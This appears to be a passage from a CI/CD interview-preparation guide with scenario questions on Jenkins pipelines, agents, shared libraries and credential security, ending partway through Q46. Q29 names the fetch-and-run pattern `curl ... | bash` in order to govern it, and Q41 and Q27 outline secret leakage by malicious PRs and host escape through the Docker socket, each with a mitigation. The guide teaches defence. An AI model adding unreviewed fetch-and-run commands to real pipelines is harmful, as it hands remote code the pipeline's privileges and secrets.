# CI/CD — Scenario-Based Questions

<!-- DEVOPS-SHACK:HEADER -->
<p align="center">
  <a href="https://www.youtube.com/@devopsshack"><img alt="YouTube DevOps Shack" src="https://img.shields.io/badge/YouTube-DevOps%20Shack-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://www.youtube.com/@shackverse"><img alt="YouTube DevOps Shack Hindi" src="https://img.shields.io/badge/Hindi-@shackverse-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://devopsshack.com"><img alt="devopsshack.com" src="https://img.shields.io/badge/Courses-devopsshack.com-C6FF4D?style=flat-square&labelColor=0B0F1A"/></a>
  <a href="https://www.instagram.com/devopsshack"><img alt="Instagram" src="https://img.shields.io/badge/Instagram-@devopsshack-E4405F?style=flat-square&logo=instagram&logoColor=white"/></a>
  <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack"><img alt="Original repo" src="https://img.shields.io/badge/Original-DevOps%20Shack%20repo-4DE8FF?style=flat-square&logo=github&labelColor=0B0F1A"/></a>
</p>
<p align="center"><sub>Part of <b><a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">DevOps &amp; Cloud Interview Preparation</a></b> — created by <b><a href="https://www.youtube.com/@devopsshack">DevOps Shack</a></b>. Free to learn from; please credit DevOps Shack when sharing.</sub></p>
<!-- /DEVOPS-SHACK:HEADER -->

> Real-world CI/CD situations for Jenkins, GitHub Actions and GitLab CI, with the reasoning interviewers want to hear · 200 questions · 🟢 Beginner 🟡 Intermediate 🔴 Advanced

[⬅ Back to CI/CD](./README.md) · [🏠 Home](../README.md)

## Table of contents
- [Jenkins Pipelines and Agents](#jenkins-pipelines-and-agents) — Q1–Q35
- [Jenkins Shared Libraries, Credentials and Security](#jenkins-shared-libraries-credentials-and-security) — Q36–Q60
- [GitHub Actions](#github-actions) — Q61–Q100
- [GitLab CI](#gitlab-ci) — Q101–Q125
- [Builds, Artifacts, Nexus, SonarQube and Testing](#builds-artifacts-nexus-sonarqube-and-testing) — Q126–Q155
- [Deployment Strategies and GitOps](#deployment-strategies-and-gitops) — Q156–Q180
- [Secrets, Supply Chain and DORA](#secrets-supply-chain-and-dora) — Q181–Q200

---

## Jenkins Pipelines and Agents

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q1. Your team still builds jobs by clicking through Freestyle jobs in the Jenkins UI. A new service is starting. What do you set up instead? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Click-configured jobs are not versioned, not reviewable and cannot be recreated if the controller dies.

**What I'd do →**
1. Add a `Jenkinsfile` to the repo root and create a Multibranch Pipeline (or GitHub/Bitbucket Organization folder) job pointing at it.
2. Use Declarative syntax: `pipeline { agent ... stages { ... } post { ... } }`.
3. Configure the job itself with Job DSL or JCasC so even the job definition lives in Git.

**Why →** The pipeline gets code review, history, branch-specific behaviour and automatic jobs for every branch and PR.

**Interview tip →** Say "pipeline as code" and "job as code" - they are two different layers.

</details>

### Q2. A Jenkins build takes 40 minutes because unit tests, linting and security scans run one after another. How do you speed it up? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Independent stages are serialized, so total time is the sum instead of the maximum.

**What I'd do →**
1. Wrap independent stages in `parallel`:
```groovy
stage('Checks') {
  parallel {
    stage('Unit')  { steps { sh 'mvn -q test' } }
    stage('Lint')  { steps { sh 'npm run lint' } }
    stage('SAST')  { steps { sh 'semgrep ci' } }
  }
}
```
2. Set `failFast true` on the parallel block so one failure stops the rest.
3. Make sure each branch lands on its own executor.

**Why →** Wall-clock time drops to the slowest branch, and failures are reported sooner.

**Interview tip →** Mention that parallelism needs enough executors, otherwise branches just queue.

</details>

### Q3. Builds queue for 20 minutes during the morning rush, but the Jenkins nodes are mostly idle at night. What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Static capacity sized for neither peak nor trough.

**What I'd do →**
1. Move builds to ephemeral agents: the Kubernetes plugin (pod per build) or EC2 Fleet plugin with an ASG.
2. Define pod templates with the build tools baked into images, and set `idleMinutes` low.
3. Set controller executors to 0 so nothing builds on it.
4. Add queue-time metrics (Prometheus plugin) to prove the improvement.

**Why →** Capacity follows demand, every build gets a clean environment, and you stop paying for idle VMs.

**Interview tip →** Watch for the trade-off: cold pod start and image pull time, so keep images small and cached.

</details>

### Q4. A build works on agent A but fails on agent B with "command not found: mvn". How do you stop this class of problem? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Snowflake agents with different installed tools.

**What I'd do →**
1. Stop depending on tools installed on the node. Run stages in containers: `agent { docker { image 'maven:3.9-eclipse-temurin-21' } }`.
2. Or use the Jenkins `tools { maven 'M3' }` block, which installs a pinned version.
3. Build agent images from one Dockerfile or Packer template in Git.

**Why →** The toolchain becomes part of the pipeline definition, so every agent behaves the same.

**Interview tip →** "Immutable agents" is the phrase.

</details>

### Q5. You need a pipeline to build a branch automatically on push without polling. How do you wire it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Polling SCM wastes load and adds delay.

**What I'd do →**
1. Use a Multibranch or Organization folder job with the GitHub Branch Source plugin.
2. Add a webhook in the repo to `https://jenkins.example.com/github-webhook/` (or `/multibranch-webhook-trigger/invoke?token=...`).
3. Keep a long periodic scan (for example 1 day) only as a safety net.

**Why →** Push events trigger within seconds, and the controller does not poll hundreds of repos.

**Interview tip →** Mention that the webhook endpoint must be reachable from the SCM, so check ingress and firewall.

</details>

### Q6. Only the main branch should deploy; feature branches and PRs should only build and test. How do you express this? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** One Jenkinsfile, different behaviour per branch.

**What I'd do →**
```groovy
stage('Deploy') {
  when { branch 'main' }
  steps { sh './deploy.sh prod' }
}
```
For PRs use `when { changeRequest() }`, and combine with `allOf`/`anyOf` where needed.

**Why →** Declarative `when` is evaluated before the stage and keeps the stage visibly skipped in Blue Ocean and Stage View.

**Interview tip →** Add that deploy to prod should also sit behind an approval, not just a branch check.

</details>

### Q7. A pipeline sometimes hangs forever on a flaky network call and holds an executor. How do you protect the system? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** No upper bound on runtime.

**What I'd do →**
1. Set a global `options { timeout(time: 30, unit: 'MINUTES') }`.
2. Add tighter `timeout` blocks around risky steps and `retry(3)` only for idempotent operations.
3. Use `options { buildDiscarder(logRotator(numToKeepStr: '30')) }` and `disableConcurrentBuilds()` where needed.

**Why →** Timeouts free executors and give a clear failure instead of a silent stall.

**Interview tip →** Never retry non-idempotent steps like deploys without thinking about side effects.

</details>

### Q8. Two commits land seconds apart and two deploys to the same environment run concurrently, corrupting state. What do you change? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Missing mutual exclusion on a shared environment.

**What I'd do →**
1. Use `options { disableConcurrentBuilds(abortPrevious: true) }` for the branch if only the latest matters.
2. For environment-level locking across jobs use the Lockable Resources plugin: `lock(resource: 'prod-deploy') { ... }`.
3. Add `milestone()` steps so older builds are skipped once a newer one passes that point.

**Why →** Deploys to one environment must be serialized, and stale builds should not overwrite newer ones.

**Interview tip →** Mention `milestone` - many candidates only know `disableConcurrentBuilds`.

</details>

### Q9. A stage fails on a transient test flake, but you still want the build to continue and report unstable. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Not every failure should abort the pipeline, but it must not be hidden.

**What I'd do →**
```groovy
catchError(buildResult: 'UNSTABLE', stageResult: 'FAILURE') {
  sh './run-integration-tests.sh'
}
```
Publish results with `junit 'target/surefire-reports/*.xml'`, which marks the build UNSTABLE on test failures.

**Why →** The stage shows red, the build stays visible as unstable, and later stages like archiving still run.

**Interview tip →** Say you track flaky tests and fix them; `catchError` is a bandage, not a strategy.

</details>

### Q10. You must send a Slack notification and clean the workspace whether the build passes or fails. Where does that go? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cleanup and notification must be unconditional.

**What I'd do →**
```groovy
post {
  always  { junit allowEmptyResults: true, testResults: '**/target/surefire-reports/*.xml' }
  failure { slackSend channel: '#ci', message: "FAILED: ${env.JOB_NAME} #${env.BUILD_NUMBER}" }
  cleanup { cleanWs() }
}
```

**Why →** `post` conditions run after stages regardless of result, and `cleanup` runs last, after all other post conditions.

**Interview tip →** Know the order: `always`, then changed/fixed/regression, then success/failure, then `cleanup`.

</details>

### Q11. A monorepo has 12 services and every commit rebuilds all of them. How do you build only what changed in Jenkins? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** No change detection.

**What I'd do →**
1. Use `when { changeset 'services/payments/**' }` on each service stage.
2. For PRs, `changeset` compares against the change request target; for non-PR builds use `git diff --name-only HEAD~1` in a script and compute the set.
3. For larger repos, adopt a tool that understands the dependency graph (Bazel, Nx, Turborepo).

**Why →** Build time and cost scale with the change, not the repo size.

**Interview tip →** Mention shared libraries: a change in `common/` must trigger every dependent service.

</details>

### Q12. A stage needs a specific JDK version and a database for integration tests, but the agent has neither. How do you provide them? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The build needs sidecar services plus a pinned runtime.

**What I'd do →**
1. On Kubernetes agents, define a pod template with containers `maven` (JDK 21) and `postgres:16`; reach the DB at `localhost:5432` since containers share a pod network.
2. On Docker agents, start the DB with Testcontainers inside the test run, or `docker run` in a `withRun` block.
3. Wait for readiness (`pg_isready`) before tests.

**Why →** Disposable dependencies give isolated, repeatable integration tests with no shared test database.

**Interview tip →** Testcontainers over a shared QA DB is a strong answer.

</details>

### Q13. The Jenkins controller keeps running out of memory and slowing down. Builds themselves are not heavy. What is your plan? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The controller is doing work it should not, or carrying too much history.

**What I'd do →**
1. Set controller executors to 0 and push all builds to agents.
2. Cap build history with `buildDiscarder`, and remove unused plugins.
3. Replace heavy `script` logic and `@NonCPS`-free loops - Groovy runs on the controller.
4. Size the heap explicitly (`-Xms`/`-Xmx`), enable GC logs and watch with the Metrics or Prometheus plugin.
5. Move to durable-task friendly steps; avoid `sh` output parsing in huge loops.

**Why →** In Jenkins, Pipeline Groovy CPS code executes on the controller, so scripting-heavy pipelines burden it.

**Interview tip →** "Keep the controller thin: orchestrate on it, work on agents."

</details>

### Q14. You need a manual approval before production, and only the release managers group may approve. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Gated deploy with an authorized approver list.

**What I'd do →**
```groovy
stage('Approve Prod') {
  steps {
    timeout(time: 2, unit: 'HOURS') {
      input message: 'Deploy to production?', submitter: 'release-managers', ok: 'Deploy'
    }
  }
}
```
Place the `input` in a stage with `agent none` so no executor is held while waiting.

**Why →** `submitter` enforces who may proceed, and the timeout prevents abandoned pipelines.

**Interview tip →** Holding an agent during `input` is the classic mistake.

</details>

### Q15. Developers want to run the exact same pipeline steps locally before pushing. How do you design for that? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Logic buried in Groovy cannot be run on a laptop.

**What I'd do →**
1. Put build, test and package logic in scripts or a Makefile/`task`/Gradle/Maven wrapper (`make test`, `./mvnw verify`).
2. Keep the Jenkinsfile a thin orchestrator that calls those commands in the same container image developers use.
3. Use the Jenkins command-line `declarative-linter` to validate syntax before pushing.

**Why →** One definition of "build", fewer "works in CI but not locally" gaps, and the CI vendor is easier to swap.

**Interview tip →** Portability of build logic is a design principle, not a nice-to-have.

</details>

### Q16. A deploy stage must run only if the previous stage produced a specific artifact, and pass its version along. How do you share data between stages? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Stages may run on different agents, so the workspace is not shared.

**What I'd do →**
1. Pass small values through `env.APP_VERSION = readFile('version.txt').trim()`.
2. Pass files with `stash name: 'dist', includes: 'dist/**'` and `unstash 'dist'` in the later stage.
3. For large or long-lived artifacts, publish to Nexus/Artifactory and pass only the coordinates.

**Why →** Stash is meant for small files within one run; a registry is the real source of truth.

**Interview tip →** Say "build once, promote the same artifact" - never rebuild per environment.

</details>

### Q17. You need a nightly job that runs a full regression suite at 2 AM and a separate hourly smoke run. How do you schedule them? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Time-based triggers inside the pipeline.

**What I'd do →**
```groovy
triggers { cron('H 2 * * *') }
```
The `H` hashes the minute so jobs do not all start at once. For the hourly smoke run use `cron('H * * * *')` in a separate job or parameterize one job with a `SUITE` choice parameter.

**Why →** `H` spreads load, and separate jobs keep history and alerting clean.

**Interview tip →** Mention that cron triggers on multibranch jobs only fire on branches that have run the Jenkinsfile once.

</details>

### Q18. A pipeline needs to run the same test stage across Java 17, 21 and two OSes. How do you avoid copy-paste? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A matrix.

**What I'd do →**
```groovy
stage('Test') {
  matrix {
    axes {
      axis { name 'JDK'; values '17', '21' }
      axis { name 'PLATFORM'; values 'linux', 'windows' }
    }
    excludes { exclude { axis { name 'JDK'; values '17' } axis { name 'PLATFORM'; values 'windows' } } }
    stages { stage('run') { steps { echo "JDK ${JDK} on ${PLATFORM}" } } }
  }
}
```

**Why →** Declarative `matrix` generates the parallel cells and supports `excludes`.

**Interview tip →** Compare to GitHub Actions `strategy.matrix` - same idea.

</details>

### Q19. After a Jenkins upgrade, half the pipelines fail with plugin errors. How do you make upgrades safe? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Uncontrolled plugin and core drift.

**What I'd do →**
1. Pin plugins in `plugins.txt` and install with `jenkins-plugin-cli --plugin-file plugins.txt`; bake into an image.
2. Run the same image with the same JCasC in a staging controller and execute representative pipelines first.
3. Upgrade in small steps, read the plugin changelogs and the Jenkins upgrade guide, and keep the previous image for rollback.
4. Back up `JENKINS_HOME` (jobs, credentials, secrets) before touching production.

**Why →** Plugin compatibility is the main Jenkins failure mode, and an image makes the upgrade a rollbackable deploy.

**Interview tip →** "Jenkins as an immutable image plus config as code" shows maturity.

</details>

### Q20. You inherit a 900-line Jenkinsfile that nobody dares to touch. What is your approach? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Copy-pasted logic, tangled state, no tests.

**What I'd do →**
1. Freeze behaviour first: record current outputs and artifact checksums for a few representative builds.
2. Extract shell steps into versioned scripts, and repeated stage blocks into a shared library function (`vars/buildService.groovy`).
3. Move to Declarative where possible, keep scripted code only inside `script {}` blocks.
4. Add unit tests with JenkinsPipelineUnit for the library, then refactor in small PRs.
5. Compare artifacts before and after each change.

**Why →** Refactoring a pipeline safely means proving behaviour is unchanged, as with application code.

**Interview tip →** Emphasise small steps and a reference build, not a big-bang rewrite.

</details>

### Q21. Builds on a single agent are slow because every build downloads the same Maven dependencies. What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** No dependency cache, or a cold ephemeral agent each time.

**What I'd do →**
1. Point Maven at a Nexus/Artifactory proxy repository in `settings.xml` so downloads are LAN-fast and cached.
2. On static agents keep `~/.m2` persistent; on Kubernetes mount a shared PVC or use a pre-warmed image.
3. Use `mvn -B -T 1C` for parallel module builds and the Maven build cache extension where appropriate.

**Why →** A repository proxy is the most robust cache because it is shared by all agents and CI users.

**Interview tip →** Proxying also protects you if Maven Central is unavailable.

</details>

### Q22. A job must run on a particular agent that has a GPU or a license-bound tool. How do you target it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Agent selection by capability.

**What I'd do →**
1. Label the node (`gpu`, `matlab`) in node configuration.
2. Select with `agent { label 'gpu && linux' }`.
3. Set the node usage to "Only build jobs with label expressions matching this node" so general jobs do not steal it.

**Why →** Labels decouple pipelines from hostnames and protect scarce nodes.

**Interview tip →** Label expressions support `&&`, `||` and `!`.

</details>

### Q23. A pipeline needs to trigger a downstream deploy job and wait for its result. How do you do it cleanly? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Job-to-job orchestration.

**What I'd do →**
```groovy
def r = build job: 'deploy-service', wait: true, propagate: true,
  parameters: [string(name: 'VERSION', value: env.APP_VERSION)]
echo "Downstream: ${r.result}"
```
Use `propagate: false` if you want to handle failure yourself. Better still, fold the deploy into the same pipeline when one team owns both.

**Why →** Parameters carry the artifact version so the same build is promoted.

**Interview tip →** Too many chained jobs make traceability poor; prefer one pipeline with stages.

</details>

### Q24. You want a nightly pipeline to be skipped when there were no new commits since the last successful run. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Pointless scheduled builds waste agents.

**What I'd do →**
1. Use `pollSCM('H 2 * * *')` instead of `cron`, which only builds if the SCM has changes.
2. Or compare the last built revision stored in a file/build description with `git rev-parse HEAD` and call `currentBuild.result = 'NOT_BUILT'`.

**Why →** `pollSCM` triggers only on a change, so you get nightly cadence without empty runs.

**Interview tip →** Prefer webhooks for changes and cron for time-based jobs like regression.

</details>

### Q25. Your Jenkins runs on one VM and that VM dies. How would you design for recovery? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Single point of failure with state in `JENKINS_HOME`.

**What I'd do →**
1. Treat the controller as cattle: image with pinned plugins plus JCasC, jobs from Git (multibranch, Job DSL).
2. Put `JENKINS_HOME` on durable storage (EBS/EFS or a PV) and snapshot it on a schedule; keep the `secrets/` dir backed up and encrypted.
3. Automate rebuild with Terraform/Helm; practise a restore drill.
4. Note that open-source Jenkins is active/passive, not active/active; use a warm standby that mounts the same volume only if you can fence the primary.

**Why →** If config is in Git and state is in a snapshot, recovery time is minutes.

**Interview tip →** Be honest that OSS Jenkins does not scale horizontally per controller; teams split into several controllers.

</details>

### Q26. A pipeline publishes test results, but Jenkins shows "no test report files were found" and the build is green. Is that acceptable? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Tests may not have run at all, and the pipeline lies by silence.

**What I'd do →**
1. Check the report glob path and that tests produced XML (`target/surefire-reports/*.xml`).
2. Remove `allowEmptyResults: true` so an empty result fails the build.
3. Add a coverage or minimum test-count gate.

**Why →** A green build with zero tests is the worst kind of false confidence.

**Interview tip →** "Fail closed" on missing evidence.

</details>

### Q27. You need to build a Docker image from a pipeline without giving the build access to the host Docker socket. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Mounting `/var/run/docker.sock` gives root-equivalent access to the node.

**What I'd do →**
1. Use daemonless builders: Kaniko, BuildKit rootless, or Buildah, running as a container in a Kubernetes agent pod.
2. Example container step: `/kaniko/executor --context $WORKSPACE --dockerfile Dockerfile --destination $REG/app:$TAG`.
3. Authenticate to the registry with a mounted pull-secret or short-lived credentials, and isolate build pods in their own namespace with a restricted PodSecurity level.

**Why →** Anyone who can run a pipeline could otherwise escape to the host through the Docker socket.

**Interview tip →** Mention that Kaniko is archived upstream by Google, so evaluate BuildKit or Buildah for new setups.

</details>

### Q28. An approval step blocks the pipeline and the executor stays occupied for hours. Fix it. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The `input` is inside a stage that already holds an agent.

**What I'd do →**
1. Set top-level `agent none`, and give each build stage its own `agent`.
2. Put the `input` stage with `agent none` between them.
3. Wrap it in `timeout` so abandoned runs expire.

**Why →** Waiting on a human consumes no executor, only a lightweight flyweight on the controller.

**Interview tip →** Same principle as not holding a DB connection while waiting on a user.

</details>

### Q29. Developers keep adding ad-hoc `sh 'curl ... | bash'` steps to the pipeline. How do you govern this? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Unreviewed code runs with CI privileges.

**What I'd do →**
1. Require PR review with CODEOWNERS on `Jenkinsfile` and the shared library.
2. Expose approved capabilities as shared-library steps and pre-built agent images.
3. Block outbound internet from agents except through the artifact proxy.
4. Scan scripts in CI with shellcheck and a policy check on forbidden patterns.

**Why →** The pipeline is a privileged execution environment, so it needs the same controls as production code.

**Interview tip →** Network egress control is the control that actually holds.

</details>

### Q30. A feature branch pipeline must use a different config than main, but you do not want a second Jenkinsfile. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Same pipeline, branch-aware parameters.

**What I'd do →**
1. Use `env.BRANCH_NAME` and `when` conditions, or compute values in an `environment {}` block with ternaries.
2. Use `env.CHANGE_ID` to detect PRs and skip publish steps.
3. Keep environment-specific values in config files or Helm values per environment, not in Groovy.

**Why →** One pipeline definition is easier to maintain and audit.

**Interview tip →** Config lives with the environment, logic lives in the pipeline.

</details>

### Q31. A build needs to run inside a pod with three containers (builder, scanner, deployer), each using a different image. How do you structure it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Kubernetes plugin pod with multiple containers.

**What I'd do →**
```groovy
agent {
  kubernetes {
    yaml '''
    spec:
      containers:
      - name: build
        image: maven:3.9-eclipse-temurin-21
        command: [sleep]
        args: [infinity]
      - name: scan
        image: aquasec/trivy:latest
        command: [sleep]
        args: [infinity]
    '''
  }
}
```
Then `container('build') { sh 'mvn -B verify' }` and `container('scan') { sh 'trivy fs .' }`.

**Why →** Containers share the workspace volume, so each tool runs in its own clean image.

**Interview tip →** Pin image tags or digests; `latest` makes builds non-reproducible.

</details>

### Q32. Builds fail occasionally because the workspace has leftovers from earlier runs. What do you do? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Stale files in a reused workspace.

**What I'd do →**
1. Use `cleanWs()` in `post { cleanup { } }`, or `options { skipDefaultCheckout() }` plus `checkout scm` with `CleanBeforeCheckout`.
2. Prefer ephemeral agents so the workspace is born clean.
3. Never rely on files left in `target/` to make a build pass.

**Why →** Clean builds prove the pipeline is self-contained.

**Interview tip →** Cleaning costs cache hits; trade it off with a proper dependency cache.

</details>

### Q33. Security wants a record of who triggered each build and who approved each production deploy. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Auditability.

**What I'd do →**
1. Enable the Audit Trail plugin and ship logs to a SIEM.
2. Capture `input` approver via `def who = input(message: '...', submitter: '...', submitterParameter: 'APPROVER')`.
3. Record build cause (`currentBuild.getBuildCauses()`), commit SHA and approver in build description and in the deployment ticket/annotation.
4. Use SSO (OIDC/SAML) so identities are real people.

**Why →** Auditors need a traceable chain: commit, build, approver, deploy.

**Interview tip →** Tie it to change-management: the pipeline *is* the change record.

</details>

### Q34. A stage requires a long-running process (a test server) that must be stopped even if tests fail. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Background process lifecycle inside a stage.

**What I'd do →**
1. Start with `sh 'nohup ./start-server.sh > server.log 2>&1 & echo $! > server.pid'`, wait for the port, run tests.
2. Stop in `post { always { sh 'kill $(cat server.pid) || true' } }`.
3. Better: run the server as a container started in `docker.image(...).withRun { c -> ... }`, which cleans up automatically.

**Why →** `withRun` ties resource lifetime to the block even on failure.

**Interview tip →** Note Jenkins' `BUILD_ID` process killer: set `JENKINS_NODE_COOKIE=dontKillMe` only when a process must outlive the build.

</details>

### Q35. Management asks whether to keep Jenkins or move to GitHub Actions. How do you frame the decision? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** A platform decision, not a tool-preference debate.

**What I'd do →**
1. Inventory: number of pipelines, plugin dependencies, custom shared libraries, special agents (mainframe, on-prem networks, GPU).
2. Compare cost of ownership: controller/agent ops and plugin upgrades versus per-minute pricing and self-hosted runner operations.
3. Pilot with two representative services, migrate incrementally, and run both side by side with identical artifacts.
4. Keep Jenkins where network or compliance constraints demand it.

**Why →** The best tool is the one the team can operate cheaply and securely, and migration cost is real.

**Interview tip →** Give a recommendation with criteria; "it depends" alone loses points.

</details>

---

## Jenkins Shared Libraries, Credentials and Security

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q36. Ten teams copy the same 80-line "build and push image" stage. What do you do? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Duplicated pipeline logic drifting apart.

**What I'd do →**
1. Create a Git repo with `vars/buildAndPush.groovy` defining `def call(Map cfg)`.
2. Register it under Manage Jenkins > System > Global Trusted Pipeline Libraries with a default version.
3. Call it with `@Library('ci-lib@v1.4.0') _` and `buildAndPush(image: 'app', tag: env.GIT_COMMIT)`.

**Why →** One fix is delivered to every team, and versioning controls the blast radius.

**Interview tip →** Tag releases and pin consumers; never let everyone track `main` of a shared library.

</details>

### Q37. A shared library change broke 50 pipelines at once. How do you prevent a repeat? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Library changes were released with no testing and no staged rollout.

**What I'd do →**
1. Unit-test `vars/` steps with JenkinsPipelineUnit and Spock.
2. Release by semver tag; consumers pin `@v1`, a moving major tag, while you test `v2` on canary pipelines.
3. Have a test pipeline that loads the PR branch with `library identifier: 'ci-lib@refs/pull/..'` against sample repos.
4. Keep the previous tag available for instant rollback.

**Why →** A shared library is a dependency like any other and needs versioning, tests and canaries.

**Interview tip →** Mention that backwards compatibility rules for the library API matter.

</details>

### Q38. A pipeline needs an AWS secret key and a DB password. How do you provide them without exposing them in logs? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Secrets must be injected at runtime and masked.

**What I'd do →**
```groovy
withCredentials([usernamePassword(credentialsId: 'db-creds',
    usernameVariable: 'DB_USER', passwordVariable: 'DB_PASS')]) {
  sh 'psql "postgresql://$DB_USER:$DB_PASS@db/app" -f migrate.sql'
}
```
Use single quotes in `sh` so the shell expands the variable, not Groovy.

**Why →** With single quotes Jenkins never interpolates the secret into the Groovy string, and the console masks it.

**Interview tip →** Double-quoted Groovy interpolation of secrets triggers a Jenkins warning for good reason.

</details>

### Q39. Credentials are stored in Jenkins; the security team wants no long-lived cloud keys at all. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Replace static keys with short-lived identity.

**What I'd do →**
1. Run agents on EC2/EKS with an IAM role (instance profile or IRSA / Pod Identity); the AWS SDK then uses temporary credentials.
2. For cross-account access use `sts assume-role` with a limited session duration.
3. Remove access-key credentials from the credentials store and rotate the old keys out.
4. Where a secret must exist, source it from Vault or AWS Secrets Manager at runtime.

**Why →** No stored keys means nothing to leak, and permissions are scoped to the agent identity.

**Interview tip →** Say "workload identity" and mention least privilege per pipeline type.

</details>

### Q40. A developer asks for admin access to Jenkins to "fix their job". How do you handle it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Admin is far more than the developer needs.

**What I'd do →**
1. Use Matrix or Role-based authorization: developers get Job/Build, Job/Read, Job/Configure only for their folder.
2. Put team jobs in Folders with folder-level credentials and permissions.
3. Because jobs are defined in a Jenkinsfile, most "fixes" are PRs, not UI changes.

**Why →** Least privilege limits damage, and folder scoping contains credentials.

**Interview tip →** Folder-scoped credentials prevent team A using team B's secrets.

</details>

### Q41. A pipeline from a fork PR should not be able to read production credentials. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Untrusted code running with trusted secrets.

**What I'd do →**
1. In the GitHub/Bitbucket branch source, set trust policy to "From users with Admin or Write permission" so fork PRs build with trusted Jenkinsfile from the target.
2. Bind secrets only to stages guarded by `when { branch 'main' }`.
3. Use credentials scoped to a folder that fork builds cannot reach, and use separate, low-privilege test credentials for PR builds.

**Why →** A malicious PR could modify the Jenkinsfile to print secrets.

**Interview tip →** "Never run untrusted code with trusted secrets" applies to every CI system.

</details>

### Q42. The team wants the Jenkins configuration reproducible and reviewable. What tooling do you use? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Manual UI configuration is invisible and unrepeatable.

**What I'd do →**
1. Use Configuration as Code (JCasC) with a `jenkins.yaml` for security realm, authorization, clouds and tool installers.
2. Reference secrets as `${AWS_SECRET}` from environment or mounted files, never literals.
3. Define jobs with Job DSL seed or multibranch/org folders.
4. Apply via the Helm chart `controller.JCasC.configScripts` or an image.

**Why →** The whole controller can be recreated from Git with a review trail.

**Interview tip →** Know that JCasC supports `reload` without restart for most settings.

</details>

### Q43. A third-party Jenkins plugin has a published security advisory affecting your version. What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A known vulnerable component in a privileged system.

**What I'd do →**
1. Read the Jenkins Security Advisory for scope and whether a fix exists.
2. Update the plugin in staging, run smoke pipelines, then production in a maintenance window.
3. If no fix exists, disable or uninstall the plugin, or mitigate per the advisory.
4. Subscribe to the advisory feed and use the Plugin Manager's security warnings.

**Why →** Jenkins holds deploy credentials, so unpatched plugins are an attractive target.

**Interview tip →** Reduce plugin count deliberately; each plugin is attack surface.

</details>

### Q44. You want one pipeline step, "deployToK8s", usable by all teams but restricted so it can only deploy to namespaces the team owns. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Safe self-service with guardrails.

**What I'd do →**
1. Implement the step in the shared library; derive the allowed namespace from the folder or team name, not from caller input.
2. Use per-team Kubernetes credentials (ServiceAccount token or OIDC) bound to a namespaced Role.
3. Validate manifests with `kubeconform` and policy with OPA/Kyverno before apply.
4. Enforce authorization on the cluster side as well, never only in Groovy.

**Why →** Library checks can be bypassed; RBAC at the target is the real boundary.

**Interview tip →** "Defence in depth: library guard plus cluster RBAC."

</details>

### Q45. The shared library must call a script that is not allowed by the Script Security sandbox. How do you proceed? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Sandbox blocks a method signature.

**What I'd do →**
1. Prefer to avoid the call: use a built-in step or move logic into a shell script.
2. Global libraries configured under System settings run outside the sandbox (trusted), so keep privileged helpers there with strict code review.
3. Avoid approving arbitrary signatures in "In-process Script Approval"; approve only after reading each one.

**Why →** Script approval is a security boundary; bulk approval defeats it.

**Interview tip →** Trusted global library = full controller access, so protect it with CODEOWNERS.

</details>

### Q46. Credentials in Jenkins were rotated, but pipelines still use the old value. What went wrong? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Credential referenced in multiple places or copied.

**What I'd do →**
